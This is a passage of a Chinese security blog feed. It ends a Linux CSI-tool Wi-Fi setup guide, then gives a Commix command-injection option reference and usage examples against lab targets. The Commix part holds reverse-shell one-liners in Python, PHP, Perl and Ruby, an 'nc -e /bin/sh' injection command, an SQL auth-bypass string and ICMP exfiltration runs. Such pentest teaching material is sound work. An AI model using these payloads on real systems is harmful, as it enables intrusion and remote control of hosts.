firmware, good <span class="keyword">for</span> reference</span></span><br><span class="line">sudo cp /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</span><br><span class="line">sudo mv /lib/firmware/iwlwifi-5000-2.ucode /lib/firmware/iwlwifi-5000-2.ucode.orig</span><br><span class="line"><span class="meta">#</span><span class="bash"> copy ours <span class="keyword">in</span> separately, keeping name <span class="keyword">for</span> reference</span></span><br><span class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/</span><br><span class="line"><span class="meta">#</span><span class="bash"> install ours</span></span><br><span class="line">sudo cp iwlwifi-5000-2.ucode.sigcomm2010 /lib/firmware/iwlwifi-5000-2.ucode</span><br></pre></td></tr></table></figure><p>这一步也有点小问题，这里面的文件名可能是有些小问题，如果出错的话，把固件改名，复制到该文件夹里。<br>我的电脑里面iwlwifi系列如下所示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iwlwifi-1000-3.ucode    iwlwifi-5000-2.ucode.orig</span><br><span class="line">iwlwifi-3945-2.ucode    iwlwifi-5000-2.ucode.sigcomm2010</span><br><span class="line">iwlwifi-4965-2.ucode    iwlwifi-5150-2.ucode</span><br><span class="line">iwlwifi-5000-1.ucode.orig    iwlwifi-6000-4.ucode</span><br><span class="line">iwlwifi-5000-2.ucode</span><br></pre></td></tr></table></figure><h4 id="Download-and-compile-hostap"><a href="#Download-and-compile-hostap" class="headerlink" title="Download and compile hostap"></a>Download and compile hostap</h4><p>At the time of writing, hostap 0.7 is the stable version.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">cd                                              # Back out of the kernel tree</span><br><span class="line">git clone git://w1.fi/srv/git/hostap-07.git     # Get the code</span><br><span class="line">cd hostap-07/hostapd</span><br><span class="line">cp &lt;hostap-dotconfig&gt; .config                   # Our hostap config from linux-80211n-csitool-supplementary/hostap-config-files/</span><br><span class="line">make</span><br><span class="line">cp &lt;hostapd.conf-test&gt; hostapd.conf             # Install the vanilla hostap conf we provide</span><br></pre></td></tr></table></figure><p>这一步没有问题，安装hostapd，把电脑当作access point，功能相当于无线路由器，也可以直接用路由器，省略这一步</p><h4 id="Install-the-userspace-logging-utility"><a href="#Install-the-userspace-logging-utility" class="headerlink" title="Install the userspace logging utility"></a>Install the userspace logging utility</h4><p>The userspace netlink tool that logs CSI is located in the supplementary material git at linux-80211n-csitool-supplementary/netlink/.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~/linux-80211n-csitool-supplementary/netlink         # We assume you install into your home directory</span><br><span class="line">make                                                    # hopefully the make succeeds!</span><br><span class="line"><span class="meta">#</span><span class="bash"> If not, figure out why it didn<span class="string">'t compile. Did you install the Linux headers above?</span></span></span><br></pre></td></tr></table></figure><p>编译hostap，实际上这个不编译也没关系，因为有路由器或者安桌手机就可以充当ap</p><h4 id="Let’s-try-it-out"><a href="#Let’s-try-it-out" class="headerlink" title="Let’s try it out!"></a>Let’s try it out!</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo modprobe iwlwifi   # did it work?  Do you see logs about iwlwifi in the dmesg?</span><br><span class="line">sudo iwlist scanning    # 扫描ap，窗口中会出现可以扫描到的无线网络。</span><br><span class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</span><br><span class="line"><span class="meta">#</span><span class="bash"> 是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错</span></span><br></pre></td></tr></table></figure><p>测试hostap时：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ~/hostap-07/hostapd/hostapd ~/hostap-07/hostapd/hostapd.conf</span><br></pre></td></tr></table></figure><p>是启动hostap，此时本机电脑作为ap（相当于路由器的功能）。此时无线网络若还处于连接状态就会出错：<br>所以执行该命令前必须将无线网络连接断开，此时作为路由功能开启(出现结果)：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">using interface wlan0 with hwaddr 00:21:6a:35:4f:00 and ssid 'csitool-test'</span><br><span class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:authenticated</span><br><span class="line">wlan0:STA 38:bc:1a:0d:69:9f IEEE 802.11:associated(aid 1)</span><br></pre></td></tr></table></figure><p>手机可以连上‘csitool-test’的网络，状态一直是正在获取ip<br>Make sure to kill hostapd when you’re done. Then put 802.11n-enabled hostapd config file in place:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp &lt;hostapd.conf-real&gt; hostapd.conf             # Install the real hostap conf we provide</span><br></pre></td></tr></table></figure><p>采集csi数据部分（关闭本机电脑作为路由的功能，保证连无线网的功能即可，用另一台电脑开启hostapd作为ap）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod iwlwifi mac80211 cfg80211        # remove the modules</span><br><span class="line">sudo modprobe iwlwifi connector_log=0x1      #load the modules and set userspace beamforming logging</span><br><span class="line"><span class="meta">#</span><span class="bash">first,associate and <span class="built_in">set</span> up IP to an AP that will send you HT packets</span></span><br><span class="line"><span class="meta">#</span><span class="bash">需要用另外一台电脑作为ap并设置好IP地址，当前电脑连上那个ap</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~/linux-80211n-csitool-supplementary/netlink</span><br><span class="line">sudo ./log_to_file tmp.dat                   #当前电脑相当于dp（探测点），log_to_file tmp.dat可以记录csi的值</span><br></pre></td></tr></table></figure><p>再打开另一个终端（命令行窗口）ping ，ping所连ap的ip地址，ping多次过后便会有csi数据</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo rmmod iwlwifi mac80211 cfg80211 </span><br><span class="line">sudo modprobe iwlwifi connector_log=0x1</span><br><span class="line">cd ~/wifil/netlink</span><br><span class="line">sudo ./log_to_file  &lt;地址/文件名&gt;</span><br></pre></td></tr></table></figure><p>最后，使用该软件的时候，现一行一行地把上面代码部分粘贴到terminal里面，再连接没密码的wifi，然后再打开另一个terminal，ping 该ap的ap地址就可以运行<br>另外，安卓手机ping的ap地址是192.168.43.1<br>用路由器的话设置成接入点模式。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;我采用&lt;a href=&quot;http://dhalperi.github.io/linux-80211n-csitool/old_installation.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;old installation instruc
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>Commix命令详解</title>
    <link href="http://zer0yu.github.io/2017/01/21/Commix%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3/"/>
    <id>http://zer0yu.github.io/2017/01/21/Commix命令详解/</id>
    <published>2017-01-21T14:58:54.000Z</published>
    <updated>2017-01-21T15:00:27.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><p>项目地址：<a href="https://github.com/stasinopoulos/commix" target="_blank" rel="noopener">https://github.com/stasinopoulos/commix</a></p><p>Commix是一个使用Python开发的漏洞测试工具，这个工具是为了方便的检测一个请求是否存在命令注入漏洞，并且对其进行测试，在其作者发布的最新版本中支持直接直接导入burp的历史记录进行检测，大大提高了易用性。</p><h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">选项：</span><br><span class="line">    -v 　　　　　　　　　　VERBOSE详细程度级别（0-1，默认值：0）。</span><br><span class="line">    --version　　　　 　　显示版本号并退出。</span><br><span class="line">    --output-dir=.. 　　设置自定义输出目录路径。</span><br><span class="line">    -s SESSION_FILE　　 从存储（.sqlite）文件加载会话。</span><br><span class="line">    --flush-session　　 刷新当前目标的会话文件。</span><br><span class="line">    --ignore-session　　忽略存储在会话文件中的结果。</span><br><span class="line"></span><br><span class="line">  目标：</span><br><span class="line">    -u URL，--url = URL　　目标URL。</span><br><span class="line">    --url-reload　　　　　　在命令执行后重新加载目标URL。</span><br><span class="line">    -l LOGFILE　　　　　　　解析来自HTTP代理日志文件的目标和数据。</span><br><span class="line">    --crawl = CRAWLDEPTH  从目标网址开始抓取网站（1-2，默认值：0）。</span><br><span class="line"></span><br><span class="line">  请求：</span><br><span class="line">    --data=DATA　　　　　　要通过POST发送的数据字符串。</span><br><span class="line">    --host=HOST 　　　　　 HTTP主机头。</span><br><span class="line">    --referer=REFERER 　　HTTP Referer标头。</span><br><span class="line">    --user-agent=AGENT 　HTTP用户代理头。</span><br><span class="line">    --random-agent　　　　使用随机选择的HTTP User-Agent头。</span><br><span class="line">    --param-del=PDEL　　 设置分割参数值的字符。</span><br><span class="line">    --cookie=COOKIE 　　 HTTP Cookie头。</span><br><span class="line">    --cookie-del=CDEL 　 设置分割cookie值的字符。</span><br><span class="line">    --headers=HEADERS　  额外标头（例如「Header1：Value1 \ nHeader2：Value2」）。</span><br><span class="line">    --proxy=PROXY　　　　 使用HTTP代理（例如“127.0.0.1:8080”）。</span><br><span class="line">    --tor　　　　　　　　　 使用Tor网络。</span><br><span class="line">    --tor-port=...  　　  设置Tor代理端口（默认值：8118）。</span><br><span class="line">    --auth-url=...　　　  登录面板URL。</span><br><span class="line">    --auth-data =AUTH 　　登录参数和数据。</span><br><span class="line">    --auth-type =AUTH 　　HTTP认证类型（例如“基本”或“摘要”）。</span><br><span class="line">    --auth-cred =AUTH 　　HTTP身份验证凭据（例如“admin：admin”）。</span><br><span class="line">    --ignore-401　　　　　 忽略HTTP错误401（未授权）。</span><br><span class="line">    --force-ssl　　　　　　强制使用SSL / HTTPS。</span><br><span class="line"></span><br><span class="line">  枚举：</span><br><span class="line">    这些选项可用于枚举目标主机。</span><br><span class="line">    --all　　　　　　　　　　　　检索一切。</span><br><span class="line">    --current-user　　　　　　 检索当前用户名。</span><br><span class="line">    --hostname　　　　　　　　　检索当前主机名。</span><br><span class="line">    --is-root　　　　　　　　　 检查当前用户是否具有root权限。</span><br><span class="line">    --is-admin　　　　　　　　　检查当前用户是否具有管理员权限。</span><br><span class="line">    --sys-info　　　　　　　　　检索系统信息。</span><br><span class="line">    --users　　　　　　　　　　 检索系统用户。</span><br><span class="line">    --passwords　　　　　　　　 检索系统用户密码散列。</span><br><span class="line">    --privileges　　　　　　　 检索系统用户权限。</span><br><span class="line">    --ps-version　　　　　　　 检索PowerShell的版本号。</span><br><span class="line"></span><br><span class="line">  文件访问：</span><br><span class="line">    这些选项可用于访问目标主机上的文件。</span><br><span class="line">    --file-read = FILE ..　　从目标主机读取文件。</span><br><span class="line">    --file-write = FIL ..　　写入目标主机上的文件。</span><br><span class="line">    --file-upload = FI ..　　在目标主机上上传文件。</span><br><span class="line">    --file-dest = FILE ..　　写入和/或上传到的主机的绝对文件路径。</span><br><span class="line"></span><br><span class="line">  模块：</span><br><span class="line">    这些选项可用于增加检测和/或注射能力。</span><br><span class="line">    --icmp-exfil = IP_ ..&apos;ICMP exfiltration&apos;注入模块。  （例如&apos;ip_src = 192.168.178.1，ip_dst = 192.168.178.3&apos;）。</span><br><span class="line">    --dns-server = DNS ..“DNS exfiltration”注入模块。　　（用于DNS筛选攻击的域名）。</span><br><span class="line">    --shellshock“炮弹”注射模块。</span><br><span class="line">  注射：</span><br><span class="line">    这些选项可用于指定要插入和输入的参数,提供定制注入有效负载。</span><br><span class="line">    -p TEST_PARAMETER　　　　可测试参数。</span><br><span class="line">    --suffix = SUFFIX　　　　注入有效负载后缀字符串。</span><br><span class="line">    --prefix = PREFIX　　　　注入有效负载前缀字符串。</span><br><span class="line">    --technique = TECH　　　指定要使用的进样技术。</span><br><span class="line">    --maxlen = MAXLEN　　　 设置与时间相关的最大输出长度,注射技术（默认：10000字符）。</span><br><span class="line">    --delay = DELAY　　　　 设置与时间相关的注入的自定义时间延迟术（默认：1秒）。</span><br><span class="line">    --tmp-path = TMP_P ..  设置Web服务器的临时目录的绝对路径。</span><br><span class="line">    --root-dir = SRV_R ..  设置Web服务器根目录的绝对路径。</span><br><span class="line">    --alter-shell = AL ..  使用另一个os-shell（例如&apos;Python&apos;）。</span><br><span class="line">    --os-cmd = OS_CMD　　　 执行单个操作系统命令。</span><br><span class="line">    --os = OS　　　　　　　　将后端操作系统强制为此值。</span><br><span class="line">    --tamper = TAMPER　　　使用给定脚本篡改注射数据。</span><br><span class="line"></span><br><span class="line">  检测：</span><br><span class="line">    这些选项可用于自定义检测阶段。</span><br><span class="line"></span><br><span class="line">    --level = LEVEL　　要执行的测试级别（1-3，默认值：1）。</span><br><span class="line">    --skip-calc　　　　在检测期间跳过数学计算</span><br><span class="line">    --dependencies　　检查第三方（非内核）依赖关系。</span><br><span class="line">    --skip-waf　　　　绕过启发式检测WAF / IPS / IDS保护。</span><br></pre></td></tr></table></figure><h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">python commix.py –url=&quot;http://192.168.1.4/test/test.php?addr=INJECT_HERE” --os-cmd=&quot;nc -e /bin/sh 192.168.1.3 1234″</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Freebuf给出的一些用法（http://www.freebuf.com/sectool/64030.html）</span><br><span class="line"></span><br><span class="line">测试漏洞web应用Damn</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=INJECT_HERE&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span><br><span class="line">使用注入攻击Payload参数测试php-Charts 1.0</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=INJECT_HERE&quot; --prefix=&quot;//&quot; --suffix=&quot;&apos;&quot;</span><br><span class="line">使用特殊的头和HTTP代理测试OWASP Mutillidae</span><br><span class="line"></span><br><span class="line">python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=INJECT_HERE&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</span><br><span class="line">使用ICMP渗漏（exfiltration）技术测试Persistence</span><br><span class="line"></span><br><span class="line">su -c &quot;python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;&quot;</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">配合一些反弹shell</span><br><span class="line"></span><br><span class="line">1. Python-reverse-shell:</span><br><span class="line">　　python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\”192.168.1.3\”,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\”/bin/sh\”,\”-i\”]);’</span><br><span class="line">2. PHP-reverse-shell:</span><br><span class="line">　　php -r ‘\$sock=fsockopen(\”192.168.1.3\”,1234);exec(\”/bin/sh -i &lt;%263 &gt;%263 2&gt;%263\”);’</span><br><span class="line">3. Perl-reverse-shell:</span><br><span class="line">　　perl -e ‘use Socket;\$i=\”192.168.1.3\”;\$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\”tcp\”));if(connect(S,sockaddr_in(\$p,inet_aton(\$i))))&#123;open(STDIN,\”&gt;%26S\”);open(STDOUT,\”&gt;%26S\”);open(STDERR,\”&gt;%26S\”);exec(\”/bin/sh -i\”);&#125;;’</span><br><span class="line">4. Ruby-reverse-shell:</span><br><span class="line">　　ruby -rsocket -e ‘exit if fork;c=TCPSocket.new(\”192.168.1.3\”,1234);while(cmd=c.gets);IO.popen(cmd,\”r\”)&#123;|io|c.print io.read&#125;end’</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h4&gt;&lt;p&gt;项目地址：&lt;a href=&quot;https://github.com/stasinopoulos/commix&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>commix使用示例</title>
    <link href="http://zer0yu.github.io/2017/01/21/commix%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/"/>
    <id>http://zer0yu.github.io/2017/01/21/commix使用示例/</id>
    <published>2017-01-21T14:53:57.000Z</published>
    <updated>2017-01-21T14:57:55.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-Exploiting-Damn-Vulnerable-Web-App"><a href="#1-Exploiting-Damn-Vulnerable-Web-App" class="headerlink" title="1. Exploiting Damn Vulnerable Web App:"></a>1. Exploiting <a href="http://www.dvwa.co.uk/" target="_blank" rel="noopener">Damn Vulnerable Web App</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot; --data=&quot;ip=127.0.0.1&amp;submit=submit&quot; --cookie=&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span><br></pre></td></tr></table></figure><h4 id="2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string"><a href="#2-Exploiting-php-Charts-1-0-using-injection-payload-suffix-amp-prefix-string" class="headerlink" title="2. Exploiting php-Charts 1.0 using injection payload suffix &amp; prefix string:"></a>2. Exploiting <a href="http://www.exploit-db.com/exploits/25496/" target="_blank" rel="noopener">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot; --prefix=&quot;&apos;&quot; --suffix=&quot;//&quot;</span><br></pre></td></tr></table></figure><h4 id="3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy"><a href="#3-Exploiting-OWASP-Mutillidae-using-extra-headers-and-HTTP-proxy" class="headerlink" title="3. Exploiting OWASP Mutillidae using extra headers and HTTP proxy:"></a>3. Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae" target="_blank" rel="noopener">OWASP Mutillidae</a> using extra headers and HTTP proxy:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot; --data=&quot;target_host=127.0.0.1&quot; --headers=&quot;Accept-Language:fr\nETag:123\n&quot; --proxy=&quot;127.0.0.1:8081&quot;</span><br></pre></td></tr></table></figure><h4 id="4-Exploiting-Persistence-using-ICMP-exfiltration-technique"><a href="#4-Exploiting-Persistence-using-ICMP-exfiltration-technique" class="headerlink" title="4. Exploiting Persistence using ICMP exfiltration technique:"></a>4. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="noopener">Persistence</a> using ICMP exfiltration technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --icmp-exfil=&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</span><br></pre></td></tr></table></figure><h4 id="5-Exploiting-Persistence-using-an-alternative-python-shell"><a href="#5-Exploiting-Persistence-using-an-alternative-python-shell" class="headerlink" title="5. Exploiting Persistence using an alternative (python) shell:"></a>5. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/" target="_blank" rel="noopener">Persistence</a> using an alternative (python) shell:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.8/debug.php&quot; --data=&quot;addr=127.0.0.1&quot; --alter-shell=&quot;Python&quot;</span><br></pre></td></tr></table></figure><h4 id="6-Exploiting-Kioptrix-Level-1-1-2"><a href="#6-Exploiting-Kioptrix-Level-1-1-2" class="headerlink" title="6. Exploiting Kioptrix: Level 1.1 (#2):"></a>6. Exploiting <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar" target="_blank" rel="noopener">Kioptrix: Level 1.1 (#2)</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.2/pingit.php&quot; --data=&quot;ip=127.0.0.1E&amp;submit=submit&quot; --auth-url=&quot;http://192.168.178.2/index.php&quot; --auth-data=&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot;</span><br></pre></td></tr></table></figure><h4 id="7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique"><a href="#7-Exploiting-Kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique" class="headerlink" title="7. Exploiting Kioptrix: 2014 (#5) using custom user-agent and specified injection technique:"></a>7. Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/" target="_blank" rel="noopener">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot; --user-agent=&quot;Mozilla/4.0 Mozilla4_browser&quot; --technique=&quot;f&quot; --root-dir=&quot;/&quot;</span><br></pre></td></tr></table></figure><h4 id="8-Exploiting-CVE-2014-6271-Shellshock"><a href="#8-Exploiting-CVE-2014-6271-Shellshock" class="headerlink" title="8. Exploiting CVE-2014-6271/Shellshock:"></a>8. Exploiting <a href="https://pentesterlab.com/exercises/cve-2014-6271" target="_blank" rel="noopener">CVE-2014-6271/Shellshock</a>:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.178.4/cgi-bin/status/&quot; --shellshock</span><br></pre></td></tr></table></figure><h4 id="9-Exploiting-commix-testbed-cookie-using-cookie-based-injection"><a href="#9-Exploiting-commix-testbed-cookie-using-cookie-based-injection" class="headerlink" title="9. Exploiting commix-testbed (cookie) using cookie-based injection:"></a>9. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/cookie" target="_blank" rel="noopener">commix-testbed (cookie)</a> using cookie-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot; --cookie=&quot;addr=127.0.0.1&quot;</span><br></pre></td></tr></table></figure><h4 id="10-Exploiting-commix-testbed-user-agent-using-ua-based-injection"><a href="#10-Exploiting-commix-testbed-user-agent-using-ua-based-injection" class="headerlink" title="10. Exploiting commix-testbed (user-agent) using ua-based injection:"></a>10. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/user-agent" target="_blank" rel="noopener">commix-testbed (user-agent)</a> using ua-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot; --level=3</span><br></pre></td></tr></table></figure><h4 id="11-Exploiting-commix-testbed-referer-using-referer-based-injection"><a href="#11-Exploiting-commix-testbed-referer-using-referer-based-injection" class="headerlink" title="11. Exploiting commix-testbed (referer) using referer-based injection:"></a>11. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/referer" target="_blank" rel="noopener">commix-testbed (referer)</a> using referer-based injection:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot; --level=3</span><br></pre></td></tr></table></figure><h4 id="12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option"><a href="#12-Exploiting-Flick-2-using-custom-headers-and-base64-encoding-option" class="headerlink" title="12. Exploiting Flick 2 using custom headers and base64 encoding option:"></a>12. Exploiting <a href="https://www.vulnhub.com/entry/flick-2,122/" target="_blank" rel="noopener">Flick 2</a> using custom headers and base64 encoding option:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;https://192.168.2.12/do/cmd/*&quot; --headers=&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot; --base64</span><br></pre></td></tr></table></figure><h4 id="13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data"><a href="#13-Exploiting-commix-testbed-JSON-based-using-JSON-POST-data" class="headerlink" title="13. Exploiting commix-testbed (JSON-based) using JSON POST data:"></a>13. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/scenarios/regular/POST" target="_blank" rel="noopener">commix-testbed (JSON-based)</a> using JSON POST data:</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/commix# python commix.py --url=&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot; --data=&apos;&#123;&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;&#125;&apos;</span><br></pre></td></tr></table></figure><h4 id="14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy"><a href="#14-Exploiting-SickOs-1-1-using-shellshock-module-and-HTTP-proxy" class="headerlink" title="14. Exploiting 